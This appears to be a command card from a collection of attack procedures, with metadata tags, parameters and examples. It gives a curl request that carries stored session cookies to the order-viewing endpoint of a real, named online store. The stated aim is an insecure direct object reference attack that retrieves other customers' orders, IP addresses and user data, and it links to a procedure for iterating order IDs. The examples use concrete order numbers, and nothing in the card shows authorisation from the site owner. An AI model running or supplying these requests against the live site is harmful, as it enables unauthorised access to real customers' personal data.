---
data: >-
  curl -b cookies.txt
  "https://store.bistudio.com/order/{order_id}?confirmed=true"
tags:
  - web
  - http
  - get-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 96b58470-18c3-4ab7-a326-3ef59e7b376e
created_at: '2025-12-14T17:25:33.589Z'
updated_at: '2025-12-14T17:25:33.589Z'
verified: false
validated: true
submitted: true
---
# curl-get-order-endpoint

## Command

```bash
curl -b cookies.txt "https://store.bistudio.com/order/{order_id}?confirmed=true"
```

## Description

This command uses curl to perform an authenticated GET request to the Bohemia Interactive store's order viewing endpoint, replacing {order_id} with a specific ID. It loads session cookies from a file to maintain authentication. Use it to access order details manually or in scripts for IDOR testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Load cookies from file for session | Yes |
| `"https://store.bistudio.com/order/{order_id}?confirmed=true"` | Target URL with order ID placeholder | Yes |
| `-s` (silent) | Suppress progress meter | No |
| `-v` (verbose) | Show headers | No |

## Examples

### Basic Usage

```bash
curl -b cookies.txt "https://store.bistudio.com/order/1003793?confirmed=true"
```

### Advanced Usage

```bash
curl -b cookies.txt -s -o response.json "https://store.bistudio.com/order/1003793?confirmed=true"
```

## Expected Output

HTTP response (HTML or JSON) containing order details, such as purchase info, IP addresses, and user data if unauthorized access succeeds. Look for 200 OK status and parse for sensitive fields.

## Related

- [[Related Procedure: Access-Order-Viewing-Endpoint]]
- [[Related Procedure: Exploit-IDOR-by-Iterating-Order-IDs]]
